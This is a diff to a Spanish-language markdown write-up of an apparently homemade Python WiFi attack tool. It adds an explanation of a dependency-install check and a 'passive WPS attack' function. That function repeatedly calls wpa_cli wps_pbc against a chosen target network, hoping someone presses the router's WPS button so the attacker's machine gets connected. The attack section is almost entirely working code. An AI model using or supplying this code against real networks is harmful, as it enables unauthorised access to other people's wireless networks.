@@ -243,3 +243,51 @@ def checks():
         print(colored("[+]", 'green'), "Instaling WPA_Supplicant...")
         call(["apt-get", "install", "wpasupplicant", "-Y"])
 ```
+
+En esta funcion lo que hice fue `mirar si los programas` que necesita la herramienta para algunas cosas `estan instalados `con el comando `which` y si no lo estan instalarlos automaticamente con `apt-get install`.
+
+## SIMPLE WPS CONNECT (ataque pasivo)
+
+```py
+def simpleWPSconect(conected, target):
+    print(colored("\n[+]", 'green'), "Starting", colored("pasive", 'green'), "wps attack:")
+    ptitext = str(colored("[-] How many time do you want to stay waiting ", 'yellow') + colored("(in minutes, for example: 10): ", 'cyan'))
+    pasiveTime = int(input(ptitext))
+    print(colored("[+]", 'green'), "Waiting for someone puss the wps button...")
+    
+    t = int(pasiveTime*60)
+    t2 = int(t/50)
+    cords1 = "\x1B[0K"
+    
+    for i in range(t2):
+        tx1 = colored("[+] ", 'green')
+        counter1 = colored("[00:00.00]", 'cyan')
+        
+        call(["wpa_cli", "wps_pbc", target], stdout=DN, stderr=DN)
+        checkSconect = subprocess.check_output(["wpa_cli", "wps_pbc", target])
+        checker1 = str('b"Selected interface ' + "'" + iface + "'" + r'\nOK\n"')
+        
+        if str(checkSconect) == checker1:
+            conected = True
+            print(colored("[+] CONECTED!", 'green'))
+            break
+        
+        print("\n")
+        
+        if i != t2-1 and conected == False:
+            t = 0
+            while True:
+                t += 1
+                counter1 = colored(str(t), 'cyan')
+                print(f'{cords1}{tx1}{counter1} Trying to conect WPS...')
+                time.sleep(1)
+                if t == 50:
+                    break
+
+        print("\n")
+
+    if conected == False:
+        print(colored("[!] Unable to connect to this network! ", 'red'))
+```
+
+
